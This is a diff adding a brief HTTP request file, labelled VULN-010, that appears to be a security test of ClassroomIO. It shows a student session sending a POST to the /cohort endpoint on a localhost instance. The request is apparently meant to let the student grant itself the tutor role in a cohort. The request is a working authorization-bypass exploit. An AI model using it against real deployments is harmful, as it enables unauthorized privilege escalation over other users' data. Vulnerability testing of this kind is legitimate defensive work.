@@ -1,0 +1,9 @@
+### VULN-010 — self-grant cohort TUTOR (STUDENT session)
+### Cookie: classroomio.session_token=<STUDENT session>  (roleId 3 in the org)
+
+POST http://localhost:21527/cohort HTTP/1.1
+Host: localhost:21527
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+
+{"organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","name":"pwn-cohort-c_7928be56"}
